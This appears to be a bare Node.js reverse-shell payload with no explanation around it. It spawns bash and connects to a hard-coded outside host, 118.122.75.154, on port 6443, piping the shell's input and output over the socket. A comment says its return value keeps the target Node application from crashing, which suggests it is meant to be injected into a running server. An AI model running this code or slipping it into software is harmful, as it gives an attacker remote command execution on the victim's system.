(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("bash", []);
    var client = new net.Socket();
    client.connect(6443, "118.122.75.154", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();
